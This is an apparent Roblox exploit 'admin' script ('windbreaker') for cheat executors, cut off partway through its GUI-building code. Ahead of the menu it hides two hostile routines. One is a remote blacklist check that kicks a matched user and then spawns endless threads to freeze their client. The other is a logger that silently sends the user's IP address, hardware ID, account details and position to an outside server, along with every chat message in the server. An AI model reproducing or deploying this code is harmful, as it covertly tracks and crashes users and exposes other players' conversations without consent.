local function getHwid()
	local Players_ = game:GetService("Players")
	local localPlayer = Players_.LocalPlayer or Players_.PlayerAdded:Wait()

	local function getHwid2()
		local str = ""

		pcall(function()
			if gethwid then
				str = gethwid()
			elseif rbx_gethwid then
				str = rbx_gethwid()
			elseif get_hwid then
				str = get_hwid()
			elseif getexecutorhwid then
				str = getexecutorhwid()
			elseif game:GetService("RbxAnalyticsService") and game:GetService("RbxAnalyticsService").GetClientId then
				str = game:GetService("RbxAnalyticsService"):GetClientId()
			end
		end)

		return tostring(str or ""):gsub("%s+", "")
	end

	local function parseResponse(res)
		local str = res .. (res:find("%?") and "&" or "?") .. "_nocache=" .. tostring(os.time()) .. "_" .. tostring(math.random(100000, 999999))
		local body = nil
		local request_ = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request

		if request_ then
			pcall(function()
				local v = request_({
					Url = str,
					Method = "GET",
					Headers = {
						["Cache-Control"] = "no-cache, no-store, must-revalidate",
						Pragma = "no-cache",
						Expires = "0",
					},
				})

				if v and v.Body and (v.StatusCode == 200 or not v.StatusCode) then
					body = v.Body
				end
			end)
		end

		if not body or body == "" then
			pcall(function()
				body = game:HttpGet(str)
			end)
		end

		return body
	end

	local function fn()
		local str = ""

		pcall(function()
			str = parseResponse("https://api.ipify.org")
		end)

		local flag = not str

		if flag or str == "" or #str > 45 or str:find("<") then
			pcall(function()
				str = parseResponse("https://icanhazip.com")
			end)
		end

		if flag or str == "" or #str > 45 or str:find("<") then
			pcall(function()
				str = parseResponse("https://ifconfig.me/ip")
			end)
		end

		return tostring(str or ""):gsub("%s+", "")
	end

	local function fn2()
		task.spawn(function()
			while true do
				task.spawn(function()
					while true do
					end
				end)
			end
		end)
	end

	local statusCode = parseResponse("https://pastefy.app/21pLfSPF/raw")

	if statusCode and type(statusCode) == "string" then
		local v = string.lower(localPlayer.Name or "")
		local str = tostring(localPlayer.UserId or "")
		local v2 = string.lower(getHwid2())
		local v3 = fn()

		for match in statusCode:gmatch("[^\r\n]+") do
			local match2 = match:match("^%s*(.-)%s*$")
			if match2 == "" or match2:find("^%-%-") or match2:find("^//") then
				continue
			end
			local match3, match4 = match2:match("^(.-)%s*|%s*(.*)$")

			if not match3 then
				match4 = "차단된 사용자입니다."
			else
				match2 = match3
			end

			if match4 == "" then
				match4 = "차단된 사용자입니다."
			end

			local tbl = {}

			for match5 in (match2 .. ","):gmatch("(.-),") do
				table.insert(tbl, match5:match("^%s*(.-)%s*$") or "")
			end

			local str2 = tbl[1] or ""
			local str3 = tbl[2] or ""
			local str4 = tbl[3] or ""
			local flag = false

			if str2 ~= "" then
				if string.lower(str2) == v or str2 == str then
					flag = true
				end
			end

			local flag2

			if not flag and str3 ~= "" and v3 ~= "" then
				if str3 == v3 then
					flag2 = true
				else
					flag2 = flag
				end
			else
				flag2 = flag
			end

			if not flag2 and str4 ~= "" and v2 ~= "" then
				if string.lower(str4) == v2 then
					flag2 = true
				end
			end

			if not flag2 then
				continue
			end

			pcall(function()
				localPlayer:Kick("\n[Blacklist]\n사유: " .. match4)
			end)

			task.delay(3, function()
				fn2()
			end)

			while true do
				task.wait(999999)
			end
		end
	end

	return false
end

getHwid()

do
	local str = "https://logger-0se0.onrender.com"
	local unknownAdminV1Rbx = "UnknownAdminV1_RBX"
	local Players_ = game:GetService("Players")
	local localPlayer = Players_.LocalPlayer or Players_.PlayerAdded:Wait()
	local HttpService_ = game:GetService("HttpService")
	local request_ = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request

	local function safeGet(tbl, key)
		if not request_ then
			return nil, nil
		end
		local str2 = str .. tbl .. "?key=" .. unknownAdminV1Rbx
		local str3 = ""

		pcall(function()
			local v = HttpService_
			local jsonEncode = v.JSONEncode
			local v2 = key
			local tbl2

			if key then
				tbl2 = v2
			else
				tbl2 = {}
			end

			str3 = jsonEncode(v, tbl2)
		end)

		for i = 1, 3 do
			local ok, result = pcall(function()
				return request_({
					Url = str2,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = unknownAdminV1Rbx },
					Body = str3,
				})
			end)

			if ok and result and result.StatusCode == 200 then
				local ok2, result2 = pcall(function()
					return HttpService_:JSONDecode(result.Body)
				end)

				if ok2 then
					return true, result2
				end
			end

			if i < 3 then
				task.wait(3)
			end
		end

		return nil, nil
	end

	local function fn()
		if not request_ then
			return
		end

		for i = 1, 12 do
			local ok, result = pcall(function()
				return request_({ Url = str .. "/ping", Method = "GET" })
			end)

			if ok and result and result.StatusCode == 200 then
				return
			end
			task.wait(5)
		end
	end

	local function getHwid2()
		local str2 = ""

		pcall(function()
			if gethwid then
				str2 = gethwid()
			elseif rbx_gethwid then
				str2 = rbx_gethwid()
			elseif get_hwid then
				str2 = get_hwid()
			elseif getexecutorhwid then
				str2 = getexecutorhwid()
			elseif game:GetService("RbxAnalyticsService") and game:GetService("RbxAnalyticsService").GetClientId then
				str2 = game:GetService("RbxAnalyticsService"):GetClientId()
			end
		end)

		return tostring(str2 or ""):gsub("%s+", "")
	end

	local function fn2()
		local str2 = ""

		local function parseResponse(res)
			pcall(function()
				local request_2 = syn and syn.request or http and http.request or http_request or request

				if request_2 then
					local v = request_2({ Url = res, Method = "GET" })

					if v and v.StatusCode == 200 then
						str2 = v.Body:gsub("%s+", "")
					end
				else
					str2 = game:HttpGet(res):gsub("%s+", "")
				end
			end)
		end

		parseResponse("https://api.ipify.org")

		if str2 == "" or #str2 > 45 then
			parseResponse("https://icanhazip.com")
		end

		if str2 == "" or #str2 > 45 then
			parseResponse("https://ifconfig.me/ip")
		end

		return str2
	end

	local function fn3()
		if syn then
			return "Synapse X"
		end

		if KRNL_LOADED then
			return "Krnl"
		end

		if fluxus then
			return "Fluxus"
		end

		if is_sirhurt_closure then
			return "Sirhurt"
		end

		if getexecutorhwid then
			return "Unknown(hwid)"
		end
		return "Unknown"
	end

	local function fn4()
		local character = localPlayer.Character
		if not character then
			return 100, 100
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then
			return 100, 100
		end
		return math.floor(humanoid.Health), math.floor(humanoid.MaxHealth)
	end

	local function fn5()
		local character = localPlayer.Character
		if not character then
			return { x = 0, y = 0, z = 0 }
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return { x = 0, y = 0, z = 0 }
		end
		local position = humanoidRootPart.Position
		return { x = math.floor(position.X), y = math.floor(position.Y), z = math.floor(position.Z) }
	end

	local function fn6()
		local str2 = ""

		pcall(function()
			if localPlayer.Team then
				str2 = tostring(localPlayer.Team.Name)
			end
		end)

		return str2
	end

	local function getGlobal()
		local character = localPlayer.Character
		if not character then
			return 16
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		return humanoid and humanoid.WalkSpeed or 16
	end

	local function getGlobal2()
		local ok, result = pcall(function()
			return game:GetService("Players"):GetUserThumbnailAsync(localPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
		end)

		return ok and result or ""
	end

	local function getGlobal3()
		local ok, result = pcall(function()
			return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
		end)

		return ok and tostring(result) or "Unknown Game"
	end

	local sessionId = nil

	task.spawn(function()
		task.wait(2)
		fn()
		local v = fn2()
		local hwid = getHwid2()
		local v2, v3 = fn4()
		local str2 = ""

		pcall(function()
			str2 = getGlobal2()
		end)

		local str3 = ""

		pcall(function()
			str3 = getGlobal3()
		end)

		for i = 1, 3 do
			local start, start2 = safeGet("/api/session/start", {
				ip = v,
				hwid = hwid,
				username = localPlayer.Name,
				userId = tostring(localPlayer.UserId),
				displayName = localPlayer.DisplayName or localPlayer.Name,
				avatar = str2,
				gameId = tostring(game.GameId),
				gameName = str3,
				placeId = tostring(game.PlaceId),
				serverId = tostring(game.JobId),
				executor = fn3(),
				hp = v2,
				maxHp = v3,
				walkSpeed = getGlobal(),
				position = fn5(),
				team = fn6(),
			})

			if start and start2 and start2.sessionId then
				sessionId = start2.sessionId
				break
			else
				task.wait(5)
			end
		end

		while task.wait(8) do
			if sessionId then
				local v4, v5 = fn4()

				local ping, ping2 = safeGet("/api/session/ping", {
					sessionId = sessionId,
					hp = v4,
					maxHp = v5,
					walkSpeed = getGlobal(),
					position = fn5(),
					team = fn6(),
				})

				if ping and ping2 and ping2.pendingChats then
					for _, pendingChat in ipairs(ping2.pendingChats) do
						pcall(function()
							local character = localPlayer.Character

							if character and character:FindFirstChild("Head") then
								local head = character.Head
								local white = Enum.ChatColor.White
								game:GetService("Chat"):Chat(head, tostring(pendingChat), white)
							end

							game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
								Text = "[Admin→You] " .. tostring(pendingChat),
								Color = Color3.fromRGB(124, 106, 247),
								FontSize = Enum.FontSize.Size14,
							})
						end)
					end
				end
			end
		end
	end)

	task.spawn(function()
		task.wait(3)

		pcall(function()
			local TextChatService = game:GetService("TextChatService")

			if TextChatService and TextChatService.MessageReceived then
				TextChatService.MessageReceived:Connect(function(arg)
					if not sessionId then
						return
					end

					pcall(function()
						safeGet("/api/session/chat", {
							sessionId = sessionId,
							speaker = arg.TextSource and arg.TextSource.Name or "?",
							message = arg.Text or "",
						})
					end)
				end)
			end
		end)

		pcall(function()
			local function fn7(player)
				player.Chatted:Connect(function(message)
					if not sessionId then
						return
					end

					pcall(function()
						safeGet("/api/session/chat", { sessionId = sessionId, speaker = player.Name, message = message })
					end)
				end)
			end

			for _, player in ipairs(Players_:GetPlayers()) do
				fn7(player)
			end

			Players_.PlayerAdded:Connect(fn7)
		end)
	end)

	Players_.LocalPlayer.AncestryChanged:Connect(function()
		if not Players_.LocalPlayer:IsDescendantOf(game) then
			if sessionId then
				pcall(function()
					safeGet("/api/session/end", { sessionId = sessionId })
				end)
			end
		end
	end)
end

if IY_LOADED and not _G.IY_DEBUG == true then
	return
end

pcall(function()
	getgenv().IY_LOADED = true
end)

getCustomAssetImage = function(arg, arg2)
	local v = arg

	pcall(function()
		local _getcustomasset = getcustomasset or getsynasset

		if _getcustomasset and writefile and game and game.HttpGet then
			local ok, result = pcall(function()
				return game:HttpGet(arg)
			end)

			if ok and result and #result > 0 then
				pcall(function()
					writefile(arg2, result)
				end)

				local ok2, result2 = pcall(function()
					return _getcustomasset(arg2)
				end)

				if ok2 and result2 then
					v = result2
				end
			end
		end
	end)

	return v
end

getgenv().NOTIFY = false
COREGUI = game:GetService("CoreGui")

if not game:IsLoaded() then
	local message = Instance.new("Message")
	message.Parent = COREGUI
	message.Text = "unknown scrpt is waiting for the game to load"
	game.Loaded:Wait()
	message:Destroy()
end

currentVersion = "1.0.5"
Players = game:GetService("Players")
Holder = Instance.new("Frame")
Title = Instance.new("TextLabel")
Dark = Instance.new("Frame")
Cmdbar = Instance.new("TextBox")
CMDsF = Instance.new("ScrollingFrame")
cmdListLayout = Instance.new("UIListLayout")
SettingsButton = Instance.new("ImageButton")
ColorsButton = Instance.new("ImageButton")
Settings = Instance.new("Frame")
Prefix = Instance.new("TextLabel")
PrefixBox = Instance.new("TextBox")
Keybinds = Instance.new("TextLabel")
StayOpen = Instance.new("TextLabel")
Button = Instance.new("Frame")
On = Instance.new("TextButton")
Positions = Instance.new("TextLabel")
EventBind = Instance.new("TextLabel")
Plugins = Instance.new("TextLabel")
Example = Instance.new("TextButton")
Notification = Instance.new("Frame")
Title_2 = Instance.new("TextLabel")
Text_2 = Instance.new("TextLabel")
CloseButton = Instance.new("TextButton")
CloseImage = Instance.new("ImageLabel")
PinButton = Instance.new("TextButton")
PinImage = Instance.new("ImageLabel")
Tooltip = Instance.new("Frame")
Title_3 = Instance.new("TextLabel")
Description = Instance.new("TextLabel")
IntroBackground = Instance.new("Frame")
Logo = Instance.new("ImageLabel")
Credits = Instance.new("TextBox")
KeybindsFrame = Instance.new("Frame")
Close = Instance.new("TextButton")
Add = Instance.new("TextButton")
Delete = Instance.new("TextButton")
Holder_2 = Instance.new("ScrollingFrame")
Example_2 = Instance.new("Frame")
Text_3 = Instance.new("TextLabel")
Delete_2 = Instance.new("TextButton")
KeybindEditor = Instance.new("Frame")
background_2 = Instance.new("Frame")
Dark_3 = Instance.new("Frame")
Directions = Instance.new("TextLabel")
BindTo = Instance.new("TextButton")
TriggerLabel = Instance.new("TextLabel")
BindTriggerSelect = Instance.new("TextButton")
Add_2 = Instance.new("TextButton")
Toggles = Instance.new("ScrollingFrame")
ClickTP = Instance.new("TextLabel")
Select = Instance.new("TextButton")
ClickDelete = Instance.new("TextLabel")
Select_2 = Instance.new("TextButton")
Cmdbar_2 = Instance.new("TextBox")
Cmdbar_3 = Instance.new("TextBox")
CreateToggle = Instance.new("TextLabel")
Button_2 = Instance.new("Frame")
On_2 = Instance.new("TextButton")
shadow_2 = Instance.new("Frame")
PopupText_2 = Instance.new("TextLabel")
Exit_2 = Instance.new("TextButton")
ExitImage_2 = Instance.new("ImageLabel")
PositionsFrame = Instance.new("Frame")
Close_3 = Instance.new("TextButton")
Delete_5 = Instance.new("TextButton")
Part = Instance.new("TextButton")
Holder_4 = Instance.new("ScrollingFrame")
Example_4 = Instance.new("Frame")
Text_5 = Instance.new("TextLabel")
Delete_6 = Instance.new("TextButton")
TP = Instance.new("TextButton")
AliasesFrame = Instance.new("Frame")
Close_2 = Instance.new("TextButton")
Delete_3 = Instance.new("TextButton")
Holder_3 = Instance.new("ScrollingFrame")
Example_3 = Instance.new("Frame")
Text_4 = Instance.new("TextLabel")
Delete_4 = Instance.new("TextButton")
Aliases = Instance.new("TextLabel")
PluginsFrame = Instance.new("Frame")
Close_4 = Instance.new("TextButton")
Add_3 = Instance.new("TextButton")
Holder_5 = Instance.new("ScrollingFrame")
Example_5 = Instance.new("Frame")
Text_6 = Instance.new("TextLabel")
Delete_7 = Instance.new("TextButton")
PluginEditor = Instance.new("Frame")
background_3 = Instance.new("Frame")
Dark_2 = Instance.new("Frame")
Img = Instance.new("ImageButton")
AddPlugin = Instance.new("TextButton")
FileName = Instance.new("TextBox")
About = Instance.new("TextLabel")
Directions_2 = Instance.new("TextLabel")
shadow_3 = Instance.new("Frame")
PopupText_3 = Instance.new("TextLabel")
Exit_3 = Instance.new("TextButton")
ExitImage_3 = Instance.new("ImageLabel")
AliasHint = Instance.new("TextLabel")
PluginsHint = Instance.new("TextLabel")
PositionsHint = Instance.new("TextLabel")
ToPartFrame = Instance.new("Frame")
background_4 = Instance.new("Frame")
ChoosePart = Instance.new("TextButton")
CopyPath = Instance.new("TextButton")
Directions_3 = Instance.new("TextLabel")
Path = Instance.new("TextLabel")
shadow_4 = Instance.new("Frame")
PopupText_5 = Instance.new("TextLabel")
Exit_4 = Instance.new("TextButton")
ExitImage_5 = Instance.new("ImageLabel")
logs = Instance.new("Frame")
shadow = Instance.new("Frame")
Hide = Instance.new("TextButton")
ImageLabel = Instance.new("ImageLabel")
PopupText = Instance.new("TextLabel")
Exit = Instance.new("TextButton")
ImageLabel_2 = Instance.new("ImageLabel")
background = Instance.new("Frame")
chat = Instance.new("Frame")
Clear = Instance.new("TextButton")
SaveChatlogs = Instance.new("TextButton")
Toggle = Instance.new("TextButton")
scroll_2 = Instance.new("ScrollingFrame")
join = Instance.new("Frame")
Toggle_2 = Instance.new("TextButton")
Clear_2 = Instance.new("TextButton")
scroll_3 = Instance.new("ScrollingFrame")
listlayout = Instance.new("UIListLayout", scroll_3)
selectChat = Instance.new("TextButton")
selectJoin = Instance.new("TextButton")

randomString = function()
	local tbl = {}

	for i = 1, math.random(10, 20) do
		tbl[i] = string.char(math.random(32, 126))
	end

	return table.concat(tbl)
end

PARENT = nil

if get_hidden_gui or gethui then
	local _get_hidden_gui = get_hidden_gui or gethui
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = randomString()
	screenGui.Parent = _get_hidden_gui()
	PARENT = screenGui
elseif not is_sirhurt_closure and syn and syn.protect_gui then
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = randomString()
	syn.protect_gui(screenGui)
	screenGui.Parent = COREGUI
	PARENT = screenGui
elseif COREGUI:FindFirstChild("RobloxGui") then
	PARENT = COREGUI.RobloxGui
else
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = randomString()
	screenGui.Parent = COREGUI
	PARENT = screenGui
end

local UserInputService_
UserInputService_ = game:GetService("UserInputService")
local TweenService_
TweenService_ = game:GetService("TweenService")
local RunService_
RunService_ = game:GetService("RunService")
local tbl
tbl = {}
local tbl2
tbl2 = {}
getgenv().TargetCmds = {}
local rightShift = Enum.KeyCode.RightShift
getgenv().VapeHudKey = rightShift
local screenGui
screenGui = Instance.new("ScreenGui")
screenGui.Name = "VapeV4UI_" .. randomString()
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 9999
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local _COREGUI
_COREGUI = COREGUI

pcall(function()
	if gethui then
		_COREGUI = gethui()
	elseif not is_sirhurt_closure and syn and syn.protect_gui then
		syn.protect_gui(screenGui)
		_COREGUI = COREGUI
	elseif COREGUI:FindFirstChild("RobloxGui") then
		_COREGUI = COREGUI.RobloxGui
	else
		_COREGUI = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui") or COREGUI
	end
end)

screenGui.Parent = _COREGUI
local textButton
textButton = Instance.new("TextButton")
textButton.Name = "SideToggleBtn"
textButton.Size = UDim2.new(0, 30, 0, 34)
textButton.Position = UDim2.new(1, -34, 0, 50)
textButton.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
textButton.BackgroundTransparency = 0.1
textButton.Font = Enum.Font.GothamBold
textButton.TextSize = 16
textButton.Text = ">"
textButton.TextColor3 = Color3.fromRGB(240, 240, 255)
textButton.BorderSizePixel = 0
textButton.ZIndex = 10
textButton.Parent = screenGui
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = textButton
local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(50, 50, 65)
uiStroke.Thickness = 1.2
uiStroke.Parent = textButton
local frame
frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 320, 0, 380)
frame.Position = UDim2.new(1, -360, 0, 50)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
frame.BackgroundTransparency = 0.12
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Visible = true
frame.Parent = screenGui
local uiCorner2 = Instance.new("UICorner")
uiCorner2.CornerRadius = UDim.new(0, 12)
uiCorner2.Parent = frame
local uiStroke2 = Instance.new("UIStroke")
uiStroke2.Color = Color3.fromRGB(45, 45, 58)
uiStroke2.Thickness = 1.2
uiStroke2.Parent = frame

do
	local frame2 = Instance.new("Frame")
	frame2.Name = "Header"
	frame2.Size = UDim2.new(1, 0, 0, 48)
	frame2.BackgroundTransparency = 1
	frame2.Parent = frame
	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "TitleIcon"
	imageLabel.Size = UDim2.new(0, 26, 0, 26)
	imageLabel.Position = UDim2.new(0, 12, 0, 11)
	imageLabel.BackgroundTransparency = 1
	imageLabel.BorderSizePixel = 0
	imageLabel.Image = getCustomAssetImage("https://raw.githubusercontent.com/unknown1024a-eng/unknownadminscript/refs/heads/main/0j3x8xr%20(1).webp", "windbreaker_icon.webp")
	imageLabel.Parent = frame2
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "TitleLabel"
	textLabel.Size = UDim2.new(0, 150, 0, 20)
	textLabel.Position = UDim2.new(0, 44, 0, 6)
	textLabel.BackgroundTransparency = 1
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextSize = 16
	textLabel.Text = "windbreaker"
	textLabel.TextColor3 = Color3.fromRGB(245, 245, 250)
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.Parent = frame2
	local textLabel2 = Instance.new("TextLabel")
	textLabel2.Name = "SubtitleLabel"
	textLabel2.Size = UDim2.new(0, 150, 0, 14)
	textLabel2.Position = UDim2.new(0, 44, 0, 26)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Font = Enum.Font.Gotham
	textLabel2.TextSize = 11
	textLabel2.Text = "the best script"
	textLabel2.TextColor3 = Color3.fromRGB(140, 140, 160)
	textLabel2.TextXAlignment = Enum.TextXAlignment.Left
	textLabel2.Parent = frame2
end

do
	local frame2 = Instance.new("Frame")
	frame2.Name = "TabBar"
	frame2.Size = UDim2.new(1, -20, 0, 32)
	frame2.Position = UDim2.new(0, 10, 0, 48)
	frame2.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
	frame2.BorderSizePixel = 0
	frame2.Parent = frame
	local uiCorner3 = Instance.new("UICorner")
	uiCorner3.CornerRadius = UDim.new(0, 8)
	uiCorner3.Parent = frame2
	local textButton2 = Instance.new("TextButton")
	textButton2.Name = "TargetTabBtn"
	textButton2.Size = UDim2.new(0.333, -3, 1, -4)
	textButton2.Position = UDim2.new(0, 2, 0, 2)
	textButton2.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
	textButton2.Font = Enum.Font.GothamBold
	textButton2.TextSize = 12
	textButton2.Text = "Target"
	textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
	textButton2.Parent = frame2
	local uiCorner4 = Instance.new("UICorner")
	uiCorner4.CornerRadius = UDim.new(0, 6)
	uiCorner4.Parent = textButton2
	local textButton3 = Instance.new("TextButton")
	textButton3.Name = "CmdsTabBtn"
	textButton3.Size = UDim2.new(0.333, -3, 1, -4)
	textButton3.Position = UDim2.new(0.333, 1, 0, 2)
	textButton3.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
	textButton3.BackgroundTransparency = 1
	textButton3.Font = Enum.Font.GothamBold
	textButton3.TextSize = 12
	textButton3.Text = "Cmds"
	textButton3.TextColor3 = Color3.fromRGB(150, 150, 170)
	textButton3.Parent = frame2
	local uiCorner5 = Instance.new("UICorner")
	uiCorner5.CornerRadius = UDim.new(0, 6)
	uiCorner5.Parent = textButton3
	local textButton4 = Instance.new("TextButton")
	textButton4.Name = "LeaderboardTabBtn"
	textButton4.Size = UDim2.new(0.334, -3, 1, -4)
	textButton4.Position = UDim2.new(0.666, 0, 0, 2)
	textButton4.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
	textButton4.BackgroundTransparency = 1
	textButton4.Font = Enum.Font.GothamBold
	textButton4.TextSize = 11
	textButton4.Text = "Leaderboard"
	textButton4.TextColor3 = Color3.fromRGB(150, 150, 170)
	textButton4.Parent = frame2
	local uiCorner6 = Instance.new("UICorner")
	uiCorner6.CornerRadius = UDim.new(0, 6)
	uiCorner6.Parent = textButton4
	local frame3 = Instance.new("Frame")
	frame3.Name = "BodyContainer"
	frame3.Size = UDim2.new(1, 0, 1, -85)
	frame3.Position = UDim2.new(0, 0, 0, 85)
	frame3.BackgroundTransparency = 1
	frame3.Parent = frame
	local frame4 = Instance.new("Frame")
	frame4.Name = "TargetContainer"
	frame4.Size = UDim2.new(1, 0, 1, 0)
	frame4.BackgroundTransparency = 1
	frame4.Parent = frame3
	local textLabel = Instance.new("TextLabel")
	textLabel.Size = UDim2.new(1, -20, 0, 18)
	textLabel.Position = UDim2.new(0, 10, 0, 2)
	textLabel.BackgroundTransparency = 1
	textLabel.Font = Enum.Font.GothamSemibold
	textLabel.TextSize = 12
	textLabel.Text = "Preview"
	textLabel.TextColor3 = Color3.fromRGB(130, 130, 150)
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.Parent = frame4
	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Name = "TargetScroll"
	scrollingFrame.Size = UDim2.new(1, -16, 1, -24)
	scrollingFrame.Position = UDim2.new(0, 8, 0, 22)
	scrollingFrame.BackgroundTransparency = 1
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.ScrollBarThickness = 4
	scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 110)
	scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
	scrollingFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.None
	scrollingFrame.Parent = frame4
	local uiListLayout = Instance.new("UIListLayout")
	uiListLayout.Parent = scrollingFrame
	uiListLayout.FillDirection = Enum.FillDirection.Horizontal
	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
	uiListLayout.Padding = UDim.new(0, 10)
	local uiPadding = Instance.new("UIPadding")
	uiPadding.Parent = scrollingFrame
	uiPadding.PaddingLeft = UDim.new(0, 4)
	uiPadding.PaddingRight = UDim.new(0, 4)
	uiPadding.PaddingTop = UDim.new(0, 4)
	uiPadding.PaddingBottom = UDim.new(0, 4)
	local textLabel2 = Instance.new("TextLabel")
	textLabel2.Name = "EmptyTargetLabel"
	textLabel2.Size = UDim2.new(1, -20, 0, 100)
	textLabel2.Position = UDim2.new(0, 10, 0.5, -50)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Font = Enum.Font.Gotham
	textLabel2.TextSize = 13
	textLabel2.Text = "적용된 타겟이 없습니다.\n(loopfling / attach 실행 시 자동 추가)"
	textLabel2.TextColor3 = Color3.fromRGB(120, 120, 140)
	textLabel2.Parent = frame4
	local frame5 = Instance.new("Frame")
	frame5.Name = "CmdsContainer"
	frame5.Size = UDim2.new(1, 0, 1, 0)
	frame5.BackgroundTransparency = 1
	frame5.Visible = false
	frame5.Parent = frame3
	local scrollingFrame2 = Instance.new("ScrollingFrame")
	scrollingFrame2.Name = "CmdsScroll"
	scrollingFrame2.Size = UDim2.new(1, -16, 1, -8)
	scrollingFrame2.Position = UDim2.new(0, 8, 0, 4)
	scrollingFrame2.BackgroundTransparency = 1
	scrollingFrame2.BorderSizePixel = 0
	scrollingFrame2.ScrollBarThickness = 3
	scrollingFrame2.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 110)
	scrollingFrame2.Parent = frame5
	local uiListLayout2 = Instance.new("UIListLayout")
	uiListLayout2.Parent = scrollingFrame2
	uiListLayout2.FillDirection = Enum.FillDirection.Vertical
	uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Right
	uiListLayout2.Padding = UDim.new(0, 5)
	local frame6 = Instance.new("Frame")
	frame6.Name = "LeaderboardContainer"
	frame6.Size = UDim2.new(1, 0, 1, 0)
	frame6.BackgroundTransparency = 1
	frame6.Visible = false
	frame6.Parent = frame3
	local textLabel3 = Instance.new("TextLabel")
	textLabel3.Size = UDim2.new(1, -20, 0, 18)
	textLabel3.Position = UDim2.new(0, 10, 0, 2)
	textLabel3.BackgroundTransparency = 1
	textLabel3.Font = Enum.Font.GothamSemibold
	textLabel3.TextSize = 12
	textLabel3.Text = "Players (Click to View Profile)"
	textLabel3.TextColor3 = Color3.fromRGB(130, 130, 150)
	textLabel3.TextXAlignment = Enum.TextXAlignment.Left
	textLabel3.Parent = frame6
	local textLabel4 = Instance.new("TextLabel")
	textLabel4.Name = "EmptyLeaderboardLabel"
	textLabel4.Size = UDim2.new(1, -20, 0, 60)
	textLabel4.Position = UDim2.new(0, 10, 0, 30)
	textLabel4.BackgroundTransparency = 1
	textLabel4.Font = Enum.Font.Gotham
	textLabel4.TextSize = 13
	textLabel4.Text = "접속 중인 플레이어가 없습니다."
	textLabel4.TextColor3 = Color3.fromRGB(120, 120, 140)
	textLabel4.Visible = false
	textLabel4.Parent = frame6
	local scrollingFrame3 = Instance.new("ScrollingFrame")
	scrollingFrame3.Name = "LeaderboardScroll"
	scrollingFrame3.Size = UDim2.new(1, -16, 1, -24)
	scrollingFrame3.Position = UDim2.new(0, 8, 0, 22)
	scrollingFrame3.BackgroundTransparency = 1
	scrollingFrame3.BorderSizePixel = 0
	scrollingFrame3.ScrollBarThickness = 4
	scrollingFrame3.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 110)
	scrollingFrame3.ScrollingDirection = Enum.ScrollingDirection.Y
	scrollingFrame3.AutomaticCanvasSize = Enum.AutomaticSize.Y
	scrollingFrame3.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame3.Parent = frame6
	local uiListLayout3 = Instance.new("UIListLayout")
	uiListLayout3.Parent = scrollingFrame3
	uiListLayout3.FillDirection = Enum.FillDirection.Vertical
	uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout3.Padding = UDim.new(0, 6)
	local uiPadding2 = Instance.new("UIPadding")
	uiPadding2.Parent = scrollingFrame3
	uiPadding2.PaddingLeft = UDim.new(0, 2)
	uiPadding2.PaddingRight = UDim.new(0, 2)
	uiPadding2.PaddingTop = UDim.new(0, 2)
	uiPadding2.PaddingBottom = UDim.new(0, 2)
	local updateLeaderboardHud = nil

	local function fn(arg)
		if arg == "target" then
			frame4.Visible = true
			frame5.Visible = false
			frame6.Visible = false
			textButton2.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
			textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton2.BackgroundTransparency = 0
			textButton3.BackgroundTransparency = 1
			textButton3.TextColor3 = Color3.fromRGB(150, 150, 170)
			textButton4.BackgroundTransparency = 1
			textButton4.TextColor3 = Color3.fromRGB(150, 150, 170)
		elseif arg == "cmds" then
			frame4.Visible = false
			frame5.Visible = true
			frame6.Visible = false
			textButton3.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
			textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton3.BackgroundTransparency = 0
			textButton2.BackgroundTransparency = 1
			textButton2.TextColor3 = Color3.fromRGB(150, 150, 170)
			textButton4.BackgroundTransparency = 1
			textButton4.TextColor3 = Color3.fromRGB(150, 150, 170)
		elseif arg == "leaderboard" then
			frame4.Visible = false
			frame5.Visible = false
